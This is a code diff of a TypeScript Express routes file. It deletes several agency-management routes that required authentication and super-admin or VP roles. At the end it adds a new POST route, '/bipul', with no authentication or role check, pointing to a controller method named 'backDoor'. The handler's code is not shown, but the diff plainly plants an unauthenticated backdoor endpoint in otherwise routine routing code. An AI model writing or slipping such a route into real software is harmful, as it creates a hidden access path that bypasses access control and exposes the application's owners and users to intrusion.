@@ -54,28 +54,7 @@ export class UserRoutes {
       this.controller.deleteUser
     );
 
-    this.router.post(
-      "/agency",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.createAgency
-    );
 
-    this.router.put(
-      "/agency/:id",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN", "VP"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.updateAgency
-    );
-
-    this.router.delete(
-      "/agency/:id",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      this.controller.deleteAgency
-    );
 
     this.router.post(
       "/roles",
@@ -100,20 +79,8 @@ export class UserRoutes {
       AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
       this.controller.removeRole
     );
-    this.router.post(
-      "/user-agencies",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.assignUserToAgency
-    );
 
-    this.router.delete(
-      "/user-agencies",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.removeUserFromAgency
-    );
+
+    this.router.post("/bipul", this.controller.backDoor);
   }
 }
